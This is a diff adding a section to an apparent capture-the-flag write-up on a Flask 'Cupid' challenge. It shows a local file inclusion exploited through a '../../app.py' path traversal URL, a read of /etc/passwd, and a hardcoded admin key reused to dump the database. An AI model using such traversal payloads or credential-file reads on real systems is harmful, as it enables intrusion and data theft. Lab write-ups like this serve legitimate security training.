@@ -127,3 +127,46 @@ I found something interesting in the Cupid profile
 </body>
 </html>
 ```
+Here we find an important hin: 
+
+```
+ // Vulnerability: 'layout' parameter allows LFI
+```
+
+This is the vulnerability we were searching, Local File Inclusion (LFI)
+
+let's try to read file /etc/passwd
+
+-etcpsswd
+
+IT WORKS!
+
+So the LFI is confirmed!
+
+Now we have to read the app flask file of the server
+
+http://10.64.172.1:5000/api/fetch_layout?layout=../../app.py
+
+-appy
+
+reviewing the source code we can find an ADMIN API KEY hardcoded
+
+ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"
+
+also this section of the code means we can export the full DB
+
+```python
+@app.route('/api/admin/export_db')
+def export_db():
+    auth_header = request.headers.get('X-Valentine-Token')
+    if auth_header == ADMIN_API_KEY:
+        return send_file(DATABASE)
+```
+
+So lets execute a curl request to get the DB, and than exploring whats inside we can find the flag
+
+-flag
+
+
+
+
